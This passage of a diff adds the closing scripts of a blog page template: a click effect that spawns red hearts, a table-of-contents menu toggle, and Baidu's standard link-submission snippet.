+          old && old();
+          createHeart(event);
+        }
+      }
+      
+    }
+
+    function createHeart(event) {
+      var d = document.createElement("div");
+      d.className = "heart";
+      hearts.push({
+        el: d,
+        x: event.clientX - 5,
+        y: event.clientY - 5,
+        scale: 1,
+        alpha: 1,
+        color: randomColor()
+      });
+      document.body.appendChild(d);
+    }
+
+    function css(css) {
+      var style = document.createElement("style");
+      style.type = "text/css";
+      try {
+        style.appendChild(document.createTextNode(css));
+      } catch (ex) {
+        style.styleSheet.cssText = css;
+      }
+      document.getElementsByTagName('head')[0].appendChild(style);
+    }
+
+    function randomColor() {
+      // return "rgb(" + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + "," + (~~(Math.random() * 255)) + ")";
+      return "#F44336";
+    }
+
+    function addMenuEvent() {
+      var menu = document.getElementById('menu-main-post');
+      if (menu) {
+        var toc = document.getElementById('toc');
+        if (toc) {
+          menu.onclick = function() {
+            if (toc) {
+              if (toc.style.display == 'block') {
+                toc.style.display = 'none';
+              } else {
+                toc.style.display = 'block';
+              }
+            }
+          };
+        } else {
+          menu.style.display = 'none';
+        }
+      }
+    }
+
+  })(window, document);
+</script>
+
+  
+
+
+
+  
+<script>
+  (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+          bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      }
+      else {
+          bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+  })();
+</script>
+
+
+</body>
+</html>
